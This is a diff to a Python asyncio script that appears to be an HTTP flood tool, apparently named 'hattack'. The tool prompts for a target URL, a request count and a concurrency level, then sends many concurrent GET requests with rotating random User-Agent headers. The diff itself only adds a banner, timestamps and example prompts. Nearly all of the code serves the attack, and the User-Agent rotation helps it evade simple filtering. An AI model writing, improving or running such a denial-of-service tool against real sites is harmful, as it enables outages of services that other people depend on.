@@ -5,6 +5,7 @@ import asyncio
 import aiohttp
 import random
 import os
+import datetime
 
 class UI:
     RESET  = "\033[0m"
@@ -115,31 +116,51 @@ def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
 def print_banner():
-    print(f"""
+    print(rf"""
 {UI.CYAN}{UI.BOLD}
- ▄ .▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄·    ·▄▄▄▄▄▌              ·▄▄▄▄  
-██▪▐█•██  •██  ▐█ ▄█    ▐▄▄·██•  ▪     ▪     ██▪ ██ 
-██▀▐█ ▐█.▪ ▐█.▪ ██▀·    ██▪ ██▪   ▄█▀▄  ▄█▀▄ ▐█· ▐█▌
-██▌▐▀ ▐█▌· ▐█▌·▐█▪·•    ██▌.▐█▌▐▌▐█▌.▐▌▐█▌.▐▌██. ██ 
-▀▀▀ · ▀▀▀  ▀▀▀ .▀       ▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀▀▀▀• 
+
+.__            __    __                 __    
+|  |__ _____ _/  |__/  |______    ____ |  | __
+|  |  \\__  \\   __\   __\__  \ _/ ___\|  |/ /
+|   Y  \/ __ \|  |  |  |  / __ \\  \___|    < 
+|___|  (____  /__|  |__| (____  /\___  >__|_ \
+     \/     \/                \/     \/     \/
+
 {UI.RESET}
 """)
+
+def get_timestamp():
+    return datetime.datetime.now().strftime("%H:%M:%S")
 
 def get_user_input():
     clear_screen()
     print_banner()
 
     print(f"{UI.YELLOW}[Configuration]{UI.RESET}")
+    print(f"{UI.DIM}Examples: requests=1000 | concurrency=100{UI.RESET}\n")
 
-    target_url = input(f"{UI.GREEN}› Target URL            : {UI.RESET}").strip()
+    timestamp = get_timestamp()
+    print(f"{UI.CYAN}[{timestamp}]{UI.RESET} Starting configuration...\n")
+
+    target_url = input(
+        f"{UI.GREEN}› Target URL            {UI.DIM}(e.g. https://example.com){UI.RESET} : "
+    ).strip()
 
     if not target_url.startswith("http"):
         print(f"{UI.RED}[ERROR]{UI.RESET} URL must start with http:// or https://")
         exit()
 
     try:
-        total_requests = int(input(f"{UI.GREEN}› Total requests        : {UI.RESET}"))
-        concurrent_requests = int(input(f"{UI.GREEN}› Concurrent connections: {UI.RESET}"))
+        total_requests = int(
+            input(
+                f"{UI.GREEN}› Total requests        {UI.DIM}(e.g. 1000){UI.RESET} : "
+            )
+        )
+        concurrent_requests = int(
+            input(
+                f"{UI.GREEN}› Concurrent connections{UI.DIM}(e.g. 100){UI.RESET} : "
+            )
+        )
     except ValueError:
         print(f"{UI.RED}[ERROR]{UI.RESET} Values must be numeric")
         exit()
@@ -155,7 +176,6 @@ def get_user_input():
 
     return target_url, total_requests, concurrent_requests
 
-
 async def send_request(session, url):
     headers = {
         "User-Agent": random.choice(USER_AGENTS)
@@ -163,16 +183,17 @@ async def send_request(session, url):
 
     try:
         async with session.get(url, headers=headers) as response:
+            timestamp = f"{UI.CYAN}{get_timestamp()}{UI.RESET}"
             print(
                 f"{UI.GREEN}[OK]{UI.RESET} "
-                f"Status: {response.status}"
+                f"[{timestamp}] Status: {response.status}"
             )
     except Exception as e:
+        timestamp = f"{UI.CYAN}{get_timestamp()}{UI.RESET}"
         print(
             f"{UI.RED}[FAIL]{UI.RESET} "
-            f"{type(e).__name__}: {e}"
+            f"[{timestamp}] {type(e).__name__}: {e}"
         )
-
 
 async def main():
     clear_screen()
@@ -191,7 +212,6 @@ async def main():
                 for _ in range(total_requests)
             ]
             await asyncio.gather(*tasks)
-
 
 if __name__ == "__main__":
     asyncio.run(main())
